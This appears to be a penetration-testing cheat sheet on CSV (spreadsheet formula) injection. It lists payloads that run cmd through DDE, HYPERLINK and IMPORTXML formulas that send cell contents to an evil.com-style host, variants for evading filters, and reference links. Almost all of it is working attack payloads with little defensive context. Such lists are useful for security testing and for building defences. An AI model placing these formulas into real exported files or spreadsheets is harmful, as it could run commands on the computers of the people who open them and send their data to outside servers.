# CSV Injection

### Payloads

```
=1+1+cmd|' /C calc'!A0
-2+3+cmd|' /C calc'!A0
+2+3+cmd|' /C calc'!A0
@2+3+cmd|' /C calc'!A0

# no warning to user
=HYPERLINK("http://evil.com?x="&A3&","&B3&"[CR]","Error fetching info: Click me to resolve.")

# untested see "excel-export-attacks.pdf" for examples of DDE
=DDE("cmd";"/C calc";"__DdeLink_60_870516294")
=DDE("cmd";"/C calc";"!A0")

%0A-2+3+cmd|' /C calc'!D2      # %0A is NewLine which excel will
                               # ref: https://bugzilla.mozilla.org/show_bug.cgi?id=1259881
                               #      https://bugzilla.mozilla.org/show_bug.cgi?id=1263581

# XML Import: http://georgemauer.net/2017/10/07/csv-injection.html
=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")"
```

### Filter Evasion:

```
# Ref slide 21: https://www.slideshare.net/exploresecurity/camsec-sept-2016-tricks-to-improve-web-app-excel-export-attacks
# Slide deck is available in downloads: excel-export-attacks.pdf
=cmd| ...
-cmd| ...
"=cmd| ..."
=(cmd| ...)
=0-cmd|...
+cmd|...
""=cmd|
@sum(cmd|...)
```

### References

* [DDE Function](https://wiki.openoffice.org/wiki/Documentation/How_Tos/Calc:_DDE_function)
* [Weaponizing](https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/)
* [Excel Export Attacks](../downloads/excel-export-attacks.pdf)
